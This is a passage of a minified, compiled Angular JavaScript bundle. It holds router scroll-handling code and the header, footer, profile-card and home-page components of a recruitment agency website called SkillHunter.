            return ee([s, this.loader.loadComponent(r)]).pipe(At());
          }
          return s;
        });
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(Xt), h(ks), h(Oe), h(aa), h(Vu));
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac, providedIn: "root" })),
      e
    );
  })(),
  Wm = new b(""),
  jx = (() => {
    let e = class e {
      constructor(n, r, o, s, a = {}) {
        (this.urlSerializer = n),
          (this.transitions = r),
          (this.viewportScroller = o),
          (this.zone = s),
          (this.options = a),
          (this.lastId = 0),
          (this.lastSource = "imperative"),
          (this.restoredId = 0),
          (this.store = {}),
          (this.environmentInjector = v(Oe)),
          (a.scrollPositionRestoration ||= "disabled"),
          (a.anchorScrolling ||= "disabled");
      }
      init() {
        "disabled" !== this.options.scrollPositionRestoration &&
          this.viewportScroller.setHistoryScrollRestoration("manual"),
          (this.routerEventsSubscription = this.createScrollEvents()),
          (this.scrollEventsSubscription = this.consumeScrollEvents());
      }
      createScrollEvents() {
        return this.transitions.events.subscribe((n) => {
          n instanceof pi
            ? ((this.store[this.lastId] =
                this.viewportScroller.getScrollPosition()),
              (this.lastSource = n.navigationTrigger),
              (this.restoredId = n.restoredState
                ? n.restoredState.navigationId
                : 0))
            : n instanceof mt
            ? ((this.lastId = n.id),
              this.scheduleScrollEvent(
                n,
                this.urlSerializer.parse(n.urlAfterRedirects).fragment
              ))
            : n instanceof Kt &&
              n.code === Xs.IgnoredSameUrlNavigation &&
              ((this.lastSource = void 0),
              (this.restoredId = 0),
              this.scheduleScrollEvent(
                n,
                this.urlSerializer.parse(n.url).fragment
              ));
        });
      }
      consumeScrollEvents() {
        return this.transitions.events.subscribe((n) => {
          n instanceof ea &&
            (n.position
              ? "top" === this.options.scrollPositionRestoration
                ? this.viewportScroller.scrollToPosition([0, 0])
                : "enabled" === this.options.scrollPositionRestoration &&
                  this.viewportScroller.scrollToPosition(n.position)
              : n.anchor && "enabled" === this.options.anchorScrolling
              ? this.viewportScroller.scrollToAnchor(n.anchor)
              : "disabled" !== this.options.scrollPositionRestoration &&
                this.viewportScroller.scrollToPosition([0, 0]));
        });
      }
      scheduleScrollEvent(n, r) {
        this.zone.runOutsideAngular(() =>
          Zr(this, null, function* () {
            yield new Promise((o) => {
              setTimeout(() => {
                o();
              }),
                Es(
                  () => {
                    o();
                  },
                  { injector: this.environmentInjector }
                );
            }),
              this.zone.run(() => {
                this.transitions.events.next(
                  new ea(
                    n,
                    "popstate" === this.lastSource
                      ? this.store[this.restoredId]
                      : null,
                    r
                  )
                );
              });
          })
        );
      }
      ngOnDestroy() {
        this.routerEventsSubscription?.unsubscribe(),
          this.scrollEventsSubscription?.unsubscribe();
      }
    };
    return (
      (e.ɵfac = function (r) {
        Pp();
      }),
      (e.ɵprov = y({ token: e, factory: e.ɵfac })),
      e
    );
  })();
function Vx(t) {
  return t.routerState.root;
}
function kr(t, e) {
  return { ɵkind: t, ɵproviders: e };
}
function Bx() {
  let t = v(re);
  return (e) => {
    let i = t.get(tt);
    if (e !== i.components[0]) return;
    let n = t.get(Xt),
      r = t.get(Gm);
    1 === t.get($u) && n.initialNavigation(),
      t.get(qm, null, j.Optional)?.setUpPreloading(),
      t.get(Wm, null, j.Optional)?.init(),
      n.resetRootComponentType(i.componentTypes[0]),
      r.closed || (r.next(), r.complete(), r.unsubscribe());
  };
}
var Gm = new b("", { factory: () => new N() }),
  $u = new b("", { providedIn: "root", factory: () => 1 });
function Ux() {
  return kr(2, [
    { provide: $u, useValue: 0 },
    {
      provide: Ns,
      multi: !0,
      deps: [re],
      useFactory: (e) => {
        let i = e.get(Tg, Promise.resolve());
        return () =>
          i.then(
            () =>
              new Promise((n) => {
                let r = e.get(Xt),
                  o = e.get(Gm);
                zm(r, () => {
                  n(!0);
                }),
                  (e.get(Uu).afterPreactivation = () => (
                    n(!0), o.closed ? x(void 0) : o
                  )),
                  r.initialNavigation();
              })
          );
      },
    },
  ]);
}
function $x() {
  return kr(3, [
    {
      provide: Ns,
      multi: !0,
      useFactory: () => {
        let e = v(Xt);
        return () => {
          e.setUpLocationChangeListener();
        };
      },
    },
    { provide: $u, useValue: 2 },
  ]);
}
var qm = new b("");
function Hx(t) {
  return kr(0, [
    { provide: qm, useExisting: Lx },
    { provide: aa, useExisting: t },
  ]);
}
function zx() {
  return kr(8, [um, { provide: ca, useExisting: um }]);
}
function Wx(t) {
  return kr(9, [
    { provide: Um, useValue: Ex },
    {
      provide: $m,
      useValue: C({ skipNextTransition: !!t?.skipInitialTransition }, t),
    },
  ]);
}
var fm = new b("ROUTER_FORROOT_GUARD"),
  Gx = [
    pt,
    { provide: Sr, useClass: wr },
    Xt,
    Tr,
    { provide: Cn, useFactory: Vx, deps: [Xt] },
    Vu,
    [],
  ],
  Hu = (() => {
    let e = class e {
      constructor(n) {}
      static forRoot(n, r) {
        return {
          ngModule: e,
          providers: [
            Gx,
            [],
            { provide: sa, multi: !0, useValue: n },
            { provide: fm, useFactory: Qx, deps: [[Xt, new us(), new Zc()]] },
            { provide: Nr, useValue: r || {} },
            r?.useHash ? Yx() : Zx(),
            qx(),
            r?.preloadingStrategy ? Hx(r.preloadingStrategy).ɵproviders : [],
            r?.initialNavigation ? Kx(r) : [],
            r?.bindToComponentInputs ? zx().ɵproviders : [],
            r?.enableViewTransitions ? Wx().ɵproviders : [],
            Xx(),
          ],
        };
      }
      static forChild(n) {
        return {
          ngModule: e,
          providers: [{ provide: sa, multi: !0, useValue: n }],
        };
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(h(fm, 8));
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({})),
      e
    );
  })();
function qx() {
  return {
    provide: Wm,
    useFactory: () => {
      let t = v(Lg),
        e = v(O),
        i = v(Nr),
        n = v(Uu),
        r = v(Sr);
      return (
        i.scrollOffset && t.setOffset(i.scrollOffset), new jx(r, n, t, e, i)
      );
    },
  };
}
function Yx() {
  return { provide: Pt, useClass: Rg };
}
function Zx() {
  return { provide: Pt, useClass: Gl };
}
function Qx(t) {
  return "guarded";
}
function Kx(t) {
  return [
    "disabled" === t.initialNavigation ? $x().ɵproviders : [],
    "enabledBlocking" === t.initialNavigation ? Ux().ɵproviders : [],
  ];
}
var hm = new b("");
function Xx() {
  return [
    { provide: hm, useFactory: Bx },
    { provide: ai, multi: !0, useExisting: hm },
  ];
}
var Jx = [],
  Zm = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵmod = $({ type: e })),
      (e.ɵinj = U({ imports: [Hu.forRoot(Jx), Hu] })),
      e
    );
  })(),
  Qm = (() => {
    let e = class e {
      constructor() {
        this.menuOpen = !1;
      }
      toggleMenu() {
        this.menuOpen = !this.menuOpen;
      }
      closeMenu() {
        this.menuOpen = !1;
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵcmp = he({
        type: e,
        selectors: [["app-header"]],
        decls: 29,
        vars: 4,
        consts: [
          [1, "wrapper--header"],
          [1, "header--main", "container"],
          [1, "header--logo"],
          [1, "header--title"],
          ["href", "#", "routerLink", ""],
          ["src", "assets/images/logo.png", "alt", "SkillHunter logo"],
          [1, "header--nav"],
          ["href", "#cases", 3, "click"],
          ["href", "#tools", 3, "click"],
          ["href", "#about", 3, "click"],
          [1, "header--action"],
          [1, "burger-menu", 3, "click"],
        ],
        template: function (r, o) {
          1 & r &&
            (p(0, "div", 0)(1, "header")(2, "div", 1)(3, "div", 2)(4, "div", 3)(
              5,
              "a",
              4
            ),
            B(6, "img", 5),
            g(),
            _(7, " SkillHunter "),
            g(),
            p(8, "div", 6)(9, "nav")(10, "ul")(11, "li")(12, "a", 7),
            oe("click", function () {
              return o.closeMenu();
            }),
            _(13, "CASES"),
            g()(),
            p(14, "li")(15, "a", 8),
            oe("click", function () {
              return o.closeMenu();
            }),
            _(16, "TOOLS"),
            g()(),
            p(17, "li")(18, "a", 9),
            oe("click", function () {
              return o.closeMenu();
            }),
            _(19, "ABOUT THE AGENCY"),
            g()()()()()(),
            p(20, "div", 10)(21, "p"),
            _(22, "Request a callback and speak with an expert"),
            g(),
            p(23, "button"),
            _(24, " Write to the manager "),
            g()(),
            p(25, "div", 11),
            oe("click", function () {
              return o.toggleMenu();
            }),
            B(26, "span")(27, "span")(28, "span"),
            g()()()()),
            2 & r &&
              (Be(8), Gt("active", o.menuOpen), Be(17), Gt("open", o.menuOpen));
        },
        dependencies: [ua],
        styles: [
          ".wrapper--header[_ngcontent-%COMP%]{z-index:1000}.wrapper--header[_ngcontent-%COMP%]   .header--main[_ngcontent-%COMP%]{position:relative;display:flex;justify-content:space-between;align-items:center;min-height:70px;z-index:1}.wrapper--header[_ngcontent-%COMP%]   .header--logo[_ngcontent-%COMP%]{width:100%;height:49px;display:flex;justify-content:center;align-items:center;color:#fff;font-family:Raleway;font-size:22px;font-weight:600;line-height:140%;letter-spacing:0%;text-align:left;gap:8px}.wrapper--header[_ngcontent-%COMP%]   .header--logo[_ngcontent-%COMP%]   .header--title[_ngcontent-%COMP%]{display:flex;align-items:center;gap:8px;cursor:pointer}.wrapper--header[_ngcontent-%COMP%]   .header--nav[_ngcontent-%COMP%]{display:flex;justify-content:center;align-items:center;max-width:100%;flex-grow:1;z-index:1000}.wrapper--header[_ngcontent-%COMP%]   .header--nav[_ngcontent-%COMP%]   nav[_ngcontent-%COMP%]{display:flex;justify-content:space-between;color:#fff;font-family:Montserrat;font-size:24px;font-weight:500;text-align:left;width:75%;padding-top:5px}.wrapper--header[_ngcontent-%COMP%]   .header--nav[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]{display:flex;justify-content:space-between;align-items:center;flex-grow:1;flex-basis:0;min-width:0}.wrapper--header[_ngcontent-%COMP%]   .header--nav[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]   li[_ngcontent-%COMP%]{flex-grow:1;color:#fff;font-family:Raleway;font-size:11px;font-weight:600;line-height:140%;letter-spacing:0%;text-align:left}.wrapper--header[_ngcontent-%COMP%]   .header--nav[_ngcontent-%COMP%]   a[_ngcontent-%COMP%]{cursor:pointer}.wrapper--header[_ngcontent-%COMP%]   .header--action[_ngcontent-%COMP%]{display:flex;align-items:center}.wrapper--header[_ngcontent-%COMP%]   .header--action[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{width:132px;height:34px;color:#fff;font-family:Raleway;font-size:12px;font-weight:400;line-height:140%;letter-spacing:0%;text-align:center}.wrapper--header[_ngcontent-%COMP%]   .header--action[_ngcontent-%COMP%]   button[_ngcontent-%COMP%]{width:194px;height:41px;display:flex;flex-direction:row;justify-content:center;align-items:center;cursor:pointer;flex:none;order:1;flex-grow:0;margin:0 20px;transition:all .3s ease;border-radius:22px;background:#ff8a00;color:#fff;font-family:Raleway;font-size:12px;font-weight:700;text-align:left;text-transform:uppercase}.wrapper--header[_ngcontent-%COMP%]   .header--action[_ngcontent-%COMP%]   button[_ngcontent-%COMP%]:hover{background:#fff;color:#ff8a00;box-shadow:0 4px 8px #0003}.wrapper--header[_ngcontent-%COMP%]   .burger-menu[_ngcontent-%COMP%]{position:absolute;right:30px;display:none;flex-direction:column;justify-content:space-between;width:25px;height:20px;cursor:pointer}.wrapper--header[_ngcontent-%COMP%]   .burger-menu[_ngcontent-%COMP%]   span[_ngcontent-%COMP%]{display:block;width:100%;height:3px;background:#fff;transition:all .3s}.wrapper--header[_ngcontent-%COMP%]   .burger-menu[_ngcontent-%COMP%]   .close-icon[_ngcontent-%COMP%]{display:none;position:absolute;right:-8px;top:-8px;font-size:24px;color:#fff}.wrapper--header[_ngcontent-%COMP%]   .burger-menu.open[_ngcontent-%COMP%]   span[_ngcontent-%COMP%]:nth-child(1){transform:rotate(45deg) translate(7px,7px)}.wrapper--header[_ngcontent-%COMP%]   .burger-menu.open[_ngcontent-%COMP%]   span[_ngcontent-%COMP%]:nth-child(2){opacity:0}.wrapper--header[_ngcontent-%COMP%]   .burger-menu.open[_ngcontent-%COMP%]   span[_ngcontent-%COMP%]:nth-child(3){transform:rotate(-45deg) translate(4.5px,-5px)}.wrapper--header[_ngcontent-%COMP%]   .burger-menu.open[_ngcontent-%COMP%]   .close-icon[_ngcontent-%COMP%]{display:block}@media (max-width: 783px){.wrapper--header[_ngcontent-%COMP%]   .header--action[_ngcontent-%COMP%]   button[_ngcontent-%COMP%], .wrapper--header[_ngcontent-%COMP%]   .header--action[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{display:none!important}.wrapper--header[_ngcontent-%COMP%]   .header--nav[_ngcontent-%COMP%]{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#0b0b0f;justify-content:center;align-items:center;flex-direction:column;transition:opacity .3s ease;z-index:100}.wrapper--header[_ngcontent-%COMP%]   .header--nav.active[_ngcontent-%COMP%]{display:flex}.wrapper--header[_ngcontent-%COMP%]   .header--nav[_ngcontent-%COMP%]   nav[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]{flex-direction:column}.wrapper--header[_ngcontent-%COMP%]   .header--nav[_ngcontent-%COMP%]   nav[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]   li[_ngcontent-%COMP%]{padding:20px 0;text-align:center}.wrapper--header[_ngcontent-%COMP%]   .burger-menu[_ngcontent-%COMP%]{display:flex}.wrapper--header[_ngcontent-%COMP%]   .burger-menu.open[_ngcontent-%COMP%]{z-index:1000;position:fixed}.wrapper--header[_ngcontent-%COMP%]   .header--logo[_ngcontent-%COMP%]{justify-content:left!important}}body.menu-open[_ngcontent-%COMP%]{overflow:hidden}",
        ],
      })),
      e
    );
  })(),
  Km = (() => {
    let e = class e {};
    return (
      (e.ɵfac = function (r) {
        return new (r || e)();
      }),
      (e.ɵcmp = he({
        type: e,
        selectors: [["app-footer"]],
        decls: 18,
        vars: 0,
        consts: [
          [1, "wrapper--footer"],
          [1, "footer--main", "container"],
          [1, "footer--logo"],
          [1, "footer--logo--main"],
          ["href", "#", "routerLink", ""],
          ["src", "assets/images/logo.png", "alt", "SkillHunter logo"],
          [1, "footer--privacy"],
          [1, "footer--action"],
        ],
        template: function (r, o) {
          1 & r &&
            (p(0, "div", 0)(1, "footer")(2, "div", 1)(3, "div", 2)(4, "div", 3)(
              5,
              "a",
              4
            ),
            B(6, "img", 5),
            g(),
            _(7, " SkillHunter "),
            g(),
            p(8, "div", 6)(9, "p"),
            _(10, "© 2024, SkillHunter"),
            g(),
            p(11, "p"),
            _(12, "Privacy Policy"),
            g()()(),
            p(13, "div", 7)(14, "p"),
            _(15, "Request a callback and speak with an expert"),
            g(),
            p(16, "button"),
            _(17, "Write to the manager"),
            g()()()()());
        },
        dependencies: [ua],
        styles: [
          ".wrapper--footer[_ngcontent-%COMP%]   .footer--main[_ngcontent-%COMP%]{position:relative;display:flex;justify-content:space-between;flex-wrap:wrap;align-items:center;min-height:70px;z-index:1}.wrapper--footer[_ngcontent-%COMP%]   .footer--logo[_ngcontent-%COMP%]{min-height:49px;display:flex;flex-direction:column;color:#fff;font-family:Raleway;font-size:22px;font-weight:600;line-height:140%;letter-spacing:0%;text-align:left;gap:8px}.wrapper--footer[_ngcontent-%COMP%]   .footer--logo[_ngcontent-%COMP%]   .footer--logo--main[_ngcontent-%COMP%]{display:flex;align-items:center;gap:8px;cursor:pointer}.wrapper--footer[_ngcontent-%COMP%]   .footer--logo[_ngcontent-%COMP%]   .footer--privacy[_ngcontent-%COMP%]{display:flex;color:#fff;font-family:Raleway;font-size:12px;font-weight:400;line-height:14px;letter-spacing:0%;text-align:left;gap:20px}.wrapper--footer[_ngcontent-%COMP%]   .footer--action[_ngcontent-%COMP%]{display:flex;align-items:center}.wrapper--footer[_ngcontent-%COMP%]   .footer--action[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{width:132px;height:34px;color:#fff;font-family:Raleway;font-size:12px;font-weight:400;line-height:140%;letter-spacing:0%;text-align:left}.wrapper--footer[_ngcontent-%COMP%]   .footer--action[_ngcontent-%COMP%]   button[_ngcontent-%COMP%]{width:194px;height:41px;display:flex;flex-direction:row;justify-content:center;align-items:center;flex:none;order:1;flex-grow:0;margin:0 20px;transition:all .3s ease;border-radius:22px;background:#ff8a00;color:#fff;font-family:Raleway;font-size:12px;font-weight:700;text-align:left;text-transform:uppercase;cursor:pointer}.wrapper--footer[_ngcontent-%COMP%]   .footer--action[_ngcontent-%COMP%]   button[_ngcontent-%COMP%]:hover{background:#fff;color:#ff8a00;box-shadow:0 4px 8px #0003}@media (max-width: 783px){.wrapper--footer[_ngcontent-%COMP%]   .footer--nav[_ngcontent-%COMP%]{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:#0b0b0f;justify-content:center;align-items:center;flex-direction:column;z-index:1000;transition:opacity .3s ease}.wrapper--footer[_ngcontent-%COMP%]   .footer--nav.active[_ngcontent-%COMP%]{display:flex;background:linear-gradient(180deg,#00c2ff00,#ff29c3),#0b0b0f}.wrapper--footer[_ngcontent-%COMP%]   .footer--nav[_ngcontent-%COMP%]   nav[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]{flex-direction:column}.wrapper--footer[_ngcontent-%COMP%]   .footer--nav[_ngcontent-%COMP%]   nav[_ngcontent-%COMP%]   ul[_ngcontent-%COMP%]   li[_ngcontent-%COMP%]{padding:20px 0;text-align:center}}@media (max-width: 575px){.footer--main[_ngcontent-%COMP%]{flex-direction:column;align-items:center}.footer--action[_ngcontent-%COMP%]{display:flex;flex-direction:column;align-items:center}}body.menu-open[_ngcontent-%COMP%]{overflow:hidden}",
        ],
      })),
      e
    );
  })();
function nE(t, e) {
  if ((1 & t && (p(0, "div", 6), B(1, "img", 7), g()), 2 & t)) {
    let i = e.$implicit;
    Be(), Et("src", i.image, nr);
  }
}
function iE(t, e) {
  if ((1 & t && (p(0, "div", 4), et(1, nE, 2, 1, "div", 5), g()), 2 & t)) {
    let i = e.$implicit;
    Be(), Et("ngForOf", i);
  }
}
var Xm = (() => {
  let e = class e {
    constructor() {
      this.profileRows = [
        [
          { image: "assets/images/footer1_1.png" },
          { image: "assets/images/footer1_2.png" },
          { image: "assets/images/footer1_3.png" },
          { image: "assets/images/footer1_4.png" },
          { image: "assets/images/footer1_5.png" },
          { image: "assets/images/footer1_6.png" },
          { image: "assets/images/footer1_7.png" },
          { image: "assets/images/footer1_8.png" },
        ],
        [
          { image: "assets/images/footer2_1.png" },
          { image: "assets/images/footer2_2.png" },
          { image: "assets/images/footer2_3.png" },
          { image: "assets/images/footer2_4.png" },
          { image: "assets/images/footer2_5.png" },
          { image: "assets/images/footer2_6.png" },
          { image: "assets/images/footer2_7.png" },
        ],
      ];
    }
  };
  return (
    (e.ɵfac = function (r) {
      return new (r || e)();
    }),
    (e.ɵcmp = he({
      type: e,
      selectors: [["app-profile-cardsfooter"]],
      decls: 4,
      vars: 1,
      consts: [
        [1, "wrapper--profileCardsFooter--section"],
        [1, "wrapper--profileCardsFooter"],
        [1, "profile-cards-container"],
        ["class", "card-row", 4, "ngFor", "ngForOf"],
        [1, "card-row"],
        ["class", "profile-card--2", 4, "ngFor", "ngForOf"],
        [1, "profile-card--2"],
        ["alt", "Profile Image", 1, "profile-img", 3, "src"],
      ],
      template: function (r, o) {
        1 & r &&
          (p(0, "section", 0)(1, "div", 1)(2, "div", 2),
          et(3, iE, 2, 1, "div", 3),
          g()()()),
          2 & r && (Be(3), Et("ngForOf", o.profileRows));
      },
      dependencies: [Ng],
      styles: [
        ".wrapper--profileCardsFooter--section[_ngcontent-%COMP%]   .wrapper--profileCardsFooter[_ngcontent-%COMP%]{min-height:500px}.wrapper--profileCardsFooter--section[_ngcontent-%COMP%]   .wrapper--profileCardsFooter[_ngcontent-%COMP%]   .profile-cards-container[_ngcontent-%COMP%]{padding:200px;display:flex;flex-direction:column;align-items:center;overflow:hidden;height:169px;position:relative}.wrapper--profileCardsFooter--section[_ngcontent-%COMP%]   .wrapper--profileCardsFooter[_ngcontent-%COMP%]   .profile-cards-container[_ngcontent-%COMP%]   .card-row[_ngcontent-%COMP%]{display:flex;position:absolute;width:100%;animation-duration:20s;animation-timing-function:linear;animation-iteration-count:infinite}.wrapper--profileCardsFooter--section[_ngcontent-%COMP%]   .wrapper--profileCardsFooter[_ngcontent-%COMP%]   .profile-cards-container[_ngcontent-%COMP%]   .card-row[_ngcontent-%COMP%]:nth-child(odd){animation-name:_ngcontent-%COMP%_move-left}.wrapper--profileCardsFooter--section[_ngcontent-%COMP%]   .wrapper--profileCardsFooter[_ngcontent-%COMP%]   .profile-cards-container[_ngcontent-%COMP%]   .card-row[_ngcontent-%COMP%]:nth-child(2n){top:50%;animation-name:_ngcontent-%COMP%_move-right}.wrapper--profileCardsFooter--section[_ngcontent-%COMP%]   .wrapper--profileCardsFooter[_ngcontent-%COMP%]   .profile-cards-container[_ngcontent-%COMP%]   .card-row[_ngcontent-%COMP%]   .profile-card--2[_ngcontent-%COMP%]{display:flex;flex-direction:column;align-items:center;padding:20px;width:200px}@keyframes _ngcontent-%COMP%_move-left{0%{transform:translate(100%)}to{transform:translate(-100%)}}@keyframes _ngcontent-%COMP%_move-right{0%{transform:translate(-100%)}to{transform:translate(100%)}}",
      ],
    })),
    e
  );
})();
function oE(t, e) {
  if (1 & t) {
    let i = dg();
    p(0, "div", 120),
      oe("click", function (r) {
        return ti(i), ni(mn().closeGallery(r));
      }),
      p(1, "div", 121),
      oe("click", function (r) {
        return ti(i), ni(r.stopPropagation());
      }),
      p(2, "span", 122),
      oe("click", function () {
        return ti(i), ni(mn().closeGallery());
      }),
      _(3, "×"),
      g(),
      p(4, "div", 123)(5, "button", 124),
      oe("click", function () {
        return ti(i), ni(mn().prevImage());
      }),
      _(6, "❮"),
      g(),
      p(7, "div", 125),
      B(8, "img", 126),
      g(),
      p(9, "button", 127),
      oe("click", function () {
        return ti(i), ni(mn().nextImage());
      }),
      _(10, "❯"),
      g()()()();
  }
  if (2 & t) {
    let i = mn();
    Be(8), Et("src", i.currentImage, nr);
  }
}
var Wu,
  Jm = (() => {
    let e = class e {
      constructor(n) {
        (this.platformId = n),
          (this.lastScrollTop = 0),
          (this.currentIndex = 0),
          (this.showGallery = !1),
          (this.galleryImages = []),
          (this.currentImageIndex = 0);
      }
      openGallery(n) {
        (this.galleryImages = n),
          (this.currentImageIndex = 0),
          (this.showGallery = !0);
      }
      closeGallery(n) {
        n && n.target.classList.contains("gallery-modal"),
          (this.showGallery = !1);
      }
      get currentImage() {
        return this.galleryImages[this.currentImageIndex];
      }
      prevImage() {
        this.galleryImages.length > 1 &&
          (this.currentImageIndex =
            (this.currentImageIndex - 1 + this.galleryImages.length) %
            this.galleryImages.length);
      }
      nextImage() {
        this.galleryImages.length > 1 &&
          (this.currentImageIndex =
            (this.currentImageIndex + 1) % this.galleryImages.length);
      }
      ngAfterViewInit() {
        if (lr(this.platformId)) {
          let n = document.querySelectorAll(".info--title"),
            r = document.querySelectorAll(".fade-in-section"),
            s = new IntersectionObserver(
              (a, c) => {
                a.forEach((l) => {
                  l.isIntersecting &&
                    (l.target.classList.add("is-visible"),
                    c.unobserve(l.target));
                });
              },
              { root: null, rootMargin: "0px", threshold: 0.1 }
            );
          n.forEach((a) => s.observe(a)), r.forEach((a) => s.observe(a));
        }
      }
      handleIntersection(n, r) {
        n.forEach((o) => {
          o.isIntersecting &&
            (o.target.classList.add("is-visible"), r.unobserve(o.target));
        });
      }
    };
    return (
      (e.ɵfac = function (r) {
        return new (r || e)(P(Me));
      }),
      (e.ɵcmp = he({
        type: e,
        selectors: [["app-home"]],
        decls: 295,
        vars: 1,
        consts: [
          [1, "wrapper--home"],
          ["class", "gallery-modal", 3, "click", 4, "ngIf"],
          [1, "wrapper--standards--section", "fade-in-section"],
          [1, "wrapper--standards"],
          [1, "standards--block--main", "container"],
          [1, "standards--block--info"],
          [1, "standards--block--info--title"],
          [1, "standards--block--info--subtitile"],
          [1, "standards--block--info--description"],
          ["src", "assets/images/people.png", "alt", ""],
          ["src", "assets/images/rating.png", "alt", ""],
          [1, "standards--block--img"],
          ["src", "assets/images/header1.png", "alt", ""],
          ["src", "assets/images/header2.png", "alt", ""],
          ["src", "assets/images/header3.png", "alt", ""],
          ["src", "assets/images/header4.png", "alt", ""],
          [1, "wrapper--system--section", "fade-in-section"],
          [1, "system--section", "container"],
          [1, "system--info"],
          [1, "system--title"],
          [1, "system--description--main"],
          [1, "system--description", "phce", "card", "card-1"],
          [1, "content"],
          [1, "system--description", "phce", "card", "card-2"],
          [1, "system--description", "phce", "card", "card-3"],
          [1, "system--description", "phce", "card", "card-4"],
          [1, "wrapper--strategy--section", "fade-in-section"],
          [1, "strategy--section", "container"],
          [1, "strategy--info"],
          [1, "strategy--info--leftSide"],
          [1, "strategy--info--leftSide--title"],
          [1, "strategy--info--leftSide--subtitle"],
          [1, "strategy--info--rightSide"],
          ["src", "assets/images/hrsection2.png", "alt", ""],
          [1, "wrapper--tranding--section", "fade-in-section"],
          [1, "wrapper--tranding", "container"],
          [1, "tranding--info"],
          [1, "tranding--info--title"],
          [1, "tranding--info--card--main"],
          [1, "tranding--info--card"],
          [1, "trandind--info--card--title"],
          [1, "tranding--info--card--subtitle"],
          [1, "tranding--info--card--action"],
          [1, "wrapper--parallax--section"],
          [1, "wrapper--parallax"],
          [1, "parallax"],
          [1, "wrapper--info--text--section", "fade-in-section"],
          [1, "wrapper--circle--background"],
          [1, "wrapper--info--text", "container"],
          [1, "info--text--main"],
          [1, "info--title"],
          ["id", "cases", 1, "wrapper--cases--section", "fade-in-section"],
          [1, "wrapper--cases", "container"],
          [1, "cases--img--block--main"],
          [1, "cases--img--block--1"],
          [1, "cases--img"],
          ["src", "assets/images/phone1.png", "alt", "", 3, "click"],
          ["src", "assets/images/phone2.png", "alt", "", 3, "click"],
          ["src", "assets/images/phone3.png", "alt", "", 3, "click"],
          [1, "cases--text"],
          [1, "cases--text--title"],
          [1, "cases--text--subtitle"],
          [1, "cases--text--description"],
          [1, "cases--img--block--2"],
          [1, "cases--img", "section"],
          ["src", "assets/images/phone4.png", "alt", "", 3, "click"],
          ["src", "assets/images/phone5.png", "alt", "", 3, "click"],
          ["src", "assets/images/phone6.png", "alt", "", 3, "click"],
          ["id", "tools", 1, "wrapper--selection--section", "fade-in-section"],
          [1, "wrapper--selection", "container"],
          [1, "selection--info"],
          [1, "selection--info--leftSide"],
          [1, "selection--info--leftSide--title"],
          [1, "selection--info--leftSide--subtitle"],
          [1, "selection--info--leftSide--description"],
          [1, "selection--info--rightSide"],
          [1, "selection--info--rightSide--title"],
          [1, "selection--info--rightSide--description"],
          [1, "wrapper--selection--second--section", "fade-in-section"],
          [1, "wrapper--selection--second", "container"],
          [1, "selection--second--info"],
          [1, "selection--second--info--card--main"],
          [1, "selection--second--info--card"],
          [1, "selection--second--info--card--img"],
          ["src", "assets/images/bar_chart.png", "alt", ""],
          ["src", "assets/images/circle.png", "alt", ""],
          ["src", "assets/images/add_circle.png", "alt", ""],
          [1, "selection--second--info--card--text"],
          [1, "selection--second--info--card--text--title"],
          [1, "selection--second--info--card--text--subtitle"],
          [1, "selection--second--info--img"],
          ["src", "assets/images/back1.png", "alt", ""],
          ["src", "assets/images/back2.png", "alt", ""],
          ["src", "assets/images/back3.png", "alt", ""],
          [1, "wrapper--selection--section", "fade-in-section"],
          [1, "wrapper--selection--third--section", "fade-in-section"],
          [1, "wrapper--selection--third", "container"],
          [1, "selection--third--info"],
          [1, "selection--third--info--card--main"],
          [1, "selection--third--info--card"],
          [1, "selection--third--info--card--img"],
          [1, "selection--third--info--card--text"],
          [1, "selection--third--info--card--text--title"],
          [1, "selection--third--info--card--text--subtitle"],
          [1, "selection--third--info--img"],
          ["src", "assets/images/back4.png", "alt", ""],
          ["src", "assets/images/back5.png", "alt", ""],
          ["src", "assets/images/back6.png", "alt", ""],
          ["src", "assets/images/back7.png", "alt", ""],
          ["id", "about", 1, "wrapper--timeTested--section", "fade-in-section"],
          [1, "wrapper--timeTested", "container"],
          [1, "timeTested--info"],
          [1, "timeTested--info--text"],
          [1, "timeTested--info--text--title"],
          [1, "timeTested--info--img"],
          ["src", "assets/images/circle1.png", "alt", "Circle 1"],
          ["src", "assets/images/circle2.png", "alt", "Circle 2"],
          ["src", "assets/images/circle3.png", "alt", "Circle 3"],
          ["src", "assets/images/arrow1.png", "alt", "Arrow 1"],
          ["src", "assets/images/arrow2.png", "alt", "Arrow 2"],
          [1, "gallery-modal", 3, "click"],
          [1, "gallery-modal-content", 3, "click"],
          [1, "close", 3, "click"],
          [1, "gallery-navigation"],
          [1, "nav-button", "prev", 3, "click"],
          [1, "gallery-images"],
          ["alt", "Gallery Image", 1, "gallery-image", 3, "src"],
          [1, "nav-button", "next", 3, "click"],
        ],
        template: function (r, o) {
          1 & r &&
            (p(0, "div", 0),
            B(1, "app-header"),
            p(2, "section"),
            et(3, oE, 11, 1, "div", 1),
            g(),
            p(4, "section", 2)(5, "div", 3)(6, "div", 4)(7, "div", 5)(
              8,
              "div",
              6
            ),
            _(9, " We create the best talent according to global standards "),
            g(),
            p(10, "div", 7),
            _(
              11,
              " We successfully close the most challenging digital vacancies. We are trusted by companies with expert and non-standard projects because of our results. "
            ),
            g(),
            p(12, "div", 8),
            B(13, "img", 9)(14, "img", 10),
            g()(),
            p(15, "div", 11),
            B(16, "img", 12)(17, "img", 13)(18, "img", 14)(19, "img", 15),
            g()()()(),
            p(20, "section", 16)(21, "div", 17)(22, "div", 18)(23, "div", 19),
            _(24, " RECRUITMENT SYSTEM "),
            g(),
            p(25, "div", 20)(26, "div", 21)(27, "div", 22),
            _(28, " Attracting qualified candidates "),
            g()(),
            p(29, "div", 23)(30, "div", 22),
